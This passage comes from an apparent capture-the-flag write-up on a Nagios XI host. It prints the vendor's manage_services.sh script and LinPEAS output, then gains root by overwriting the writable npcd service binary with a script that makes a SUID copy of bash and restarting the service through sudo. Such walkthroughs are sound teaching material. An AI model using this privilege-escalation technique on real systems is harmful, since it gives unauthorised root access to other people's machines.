</span></span><span class=line><span class=cl><span class=k>if</span> ! contains first <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;First parameter must be one of: </span><span class=si>${</span><span class=nv>first</span><span class=p>[*]</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> ! contains second <span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Second parameter must be one of: </span><span class=si>${</span><span class=nv>second</span><span class=p>[*]</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>action</span><span class=o>=</span><span class=nv>$1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if service name is defined in xi-sys.cfg use that name</span>
</span></span><span class=line><span class=cl><span class=c1># else use name passed</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$2</span><span class=s2>&#34;</span> !<span class=o>=</span> <span class=s2>&#34;php-fpm&#34;</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=o>[</span> ! -z <span class=s2>&#34;</span><span class=si>${</span><span class=p>!2</span><span class=si>}</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>service</span><span class=o>=</span><span class=si>${</span><span class=p>!2</span><span class=si>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=nv>service</span><span class=o>=</span><span class=nv>$2</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if the action is status, add -n 0 to args to stop journal output</span>
</span></span><span class=line><span class=cl><span class=c1># on CentOS/RHEL 7 systems</span>
</span></span><span class=line><span class=cl><span class=nv>args</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;status&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nv>args</span><span class=o>=</span><span class=s2>&#34;-n 0&#34;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Special case for ndo2db since we don&#39;t use it anymore</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;ndo2db&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;OK - Nagios XI 5.7 uses NDO3 build in and no longer uses the ndo2db service&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Run the command</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># CentOS / Red Hat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;CentOS&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;RedHatEnterpriseServer&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;EnterpriseEnterpriseServer&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;OracleServer&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=c1># Check for enable/disable verb</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;enable&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;disable&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v systemctl<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=sb>`</span>which systemctl<span class=sb>`</span> --no-pager <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v chkconfig<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=nv>chkconfig_path</span><span class=o>=</span><span class=sb>`</span>which chkconfig<span class=sb>`</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;enable&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;</span><span class=nv>$chkconfig_path</span><span class=s2>&#34;</span> --add <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;disable&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;</span><span class=nv>$chkconfig_path</span><span class=s2>&#34;</span> --del <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>            <span class=k>fi</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>exit</span> <span class=nv>$return_code</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v systemctl<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which systemctl<span class=sb>`</span> --no-pager <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=nv>$args</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;mysqld&#34;</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=o>[</span> <span class=nv>$return_code</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=nv>service</span><span class=o>=</span><span class=s2>&#34;mariadb&#34;</span>
</span></span><span class=line><span class=cl>            <span class=sb>`</span>which systemctl<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=nv>$args</span>
</span></span><span class=line><span class=cl>            <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=o>[</span> ! <span class=sb>`</span><span class=nb>command</span> -v service<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;/etc/init.d/</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which service<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># OpenSUSE / SUSE Enterprise</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;SUSE LINUX&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$dist</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;suse11&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which service<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ubuntu / Debian</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;Debian&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$distro</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;Ubuntu&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=c1># Adjust the shellinabox service, no trailing &#39;d&#39; in Debian/Ubuntu</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;shellinaboxd&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nv>service</span><span class=o>=</span><span class=s2>&#34;shellinabox&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=sb>`</span><span class=nb>command</span> -v systemctl<span class=sb>`</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which systemctl<span class=sb>`</span> --no-pager <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=nv>$args</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=sb>`</span>which service<span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$service</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$action</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nv>return_code</span><span class=o>=</span><span class=nv>$?</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Others?</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>exit</span> <span class=nv>$return_code</span>
</span></span></code></pre></div><p>Based on the example provided in the comments, this script stops and starts services.</p><ul><li>From <code>LinPEAS</code> output I also note that I can write on some <code>services</code> files:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Analyzing .service files
</span></span></span><span class=line><span class=cl><span class=go>‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
</span></span></span><span class=line><span class=cl><span class=go>/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
</span></span></span><span class=line><span class=cl><span class=go>You can&#39;t write on systemd PATH
</span></span></span></code></pre></div><ul><li>Since we can &ldquo;write&rdquo; in these files, I will just create a simple <code>Bash</code> script to overwrite <code>/usr/local/nagios/bin/npcd</code> since this is one of the options the script <code>manage_services.sh</code> provides and, also, this is one of the services we can modify. So the malicious file is:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>cp <span class=k>$(</span>which bash<span class=k>)</span> /tmp/gunzf0x <span class=p>;</span> chmod <span class=m>4755</span> /tmp/gunzf0x
</span></span></code></pre></div><p>A simple file that creates a copy of <code>bash</code> binary and assign to it <code>SUID</code> permissions.</p><ul><li>Assign execution permission to this file and replace the original <code>npcd</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ cp /usr/local/nagios/bin/npcd /tmp/npcd_copy # Create a copy of the original service file
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ nano /tmp/npcd # Create the malicious file with the script from above
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ chmod +x /tmp/npcd # Assign execution permission to the created file
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ mv /tmp/npcd /usr/local/nagios/bin/npcd # Replace the original service file with the malicious file
</span></span></span></code></pre></div><ul><li>Then I just run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
</span></span></span></code></pre></div><ul><li>And I check if my file has been created:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 2120
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 11 root   root      4096 May 10 23:32 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 19 root   root      4096 Mar 27 10:46 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root   root      4096 May 10 18:50 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root   root   1234376 May 10 23:32 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>And it is there. Run it using <code>-p</code> to run it with owner permissions and become <code>root</code> finally running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.1# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>and we can get the <code>root</code> flag at <code>/root</code> directory.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>